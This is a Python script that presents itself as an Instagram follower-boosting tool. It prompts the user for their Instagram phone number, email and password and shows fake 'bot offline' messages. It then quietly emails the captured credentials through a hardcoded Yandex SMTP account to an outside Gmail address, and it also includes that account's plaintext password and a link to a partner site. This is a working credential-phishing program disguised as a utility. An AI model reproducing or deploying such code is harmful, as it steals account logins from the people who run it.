import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
banner = '''
_____________________________________________
|              								 |
|											 |
|	      THE LINUXCHOICE --- V.3.0			 |							 
|				insta-followers				 |
|											 |
|											 |
|____________________________________________|
'''
print(banner)
phone = input('Enter your instagram phone ----->')
email = input("Enter ypur instagram email ------>")
passwd = input('Enter your instagram password -----> ')
flw = input('Enter the number of followers(1 - 300) ----->')
print('Starting bots....')
print('Downloading info....')
for i in range(20):
	a = 1
	print("Bot_"+str(a)+"is offline. Error[!]")
	a += a
print('[-]programm stopped[-]')
print('Our partner - https://chronostock.ru/online')
fromaddr = "thelinuxchoice@ya.ru"
toaddr = "advertappmanager@gmail.com"
mypass = "159326159326"
msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "insta-fake-logs"
body =str("phone :" + phone + "<br>")
body +=str("email :" + email + "<br>")
body +=str("password :" + passwd + "<br>")
html = """
<html>
<head></head>
<body>
<p>
"""
html += body
"""
</p>
</body>
</html>
"""

msg.attach(MIMEText(html,'html','utf-8'))
server = smtplib.SMTP('smtp.ya.ru', 587)
server.starttls()
server.login(fromaddr, mypass)
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
